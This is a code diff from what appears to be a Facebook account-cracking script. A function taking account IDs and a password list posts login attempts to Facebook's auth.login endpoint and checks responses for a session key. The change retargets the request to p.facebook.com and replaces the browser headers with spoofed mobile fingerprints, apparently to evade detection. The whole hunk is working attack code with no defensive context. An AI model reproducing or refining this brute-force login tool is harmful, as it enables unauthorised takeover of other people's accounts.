@@ -664,20 +664,25 @@ def rndm(ids,passlist):
                                         "method": "auth.login",
                                         "fb_api_req_friendly_name": "authenticate",
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
-                                head = {'authority': 'mbasic.facebook.com',
-                                             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-                                             'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+                                head = {'authority': 'p.facebook.com',
+                                             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                                             'accept-language': 'en-US,en;q=0.9',
                                              'cache-control': 'max-age=0',
-                                             'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-                                             'sec-ch-ua-mobile': '?0',
-                                             'sec-ch-ua-platform': '"Linux"',
+                                             'dpr': '3',
+                                             'sec-ch-prefers-color-scheme': 'light',
+                                             'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+                                             'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+                                             'sec-ch-ua-mobile': '?1',
+                                             'sec-ch-ua-model': '"vivo 1920"',
+                                             'sec-ch-ua-platform': '"Android"',
+                                             'sec-ch-ua-platform-version': '"10.0.0"',
                                              'sec-fetch-dest': 'document',
                                              'sec-fetch-mode': 'navigate',
-                                             'sec-fetch-site': 'cross-site',
+                                             'sec-fetch-site': 'none',
                                              'sec-fetch-user': '?1',
-                                              'upgrade-insecure-requests': '1',
-                                              'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/40.0 Mobile/12F69 Safari/600.1.4',}
-                                url = 'https://b-api.facebook.com/method/auth.login'
+                                             'upgrade-insecure-requests': '1',
+                                             'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+                                url = 'https://p.facebook.com/method/auth.login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
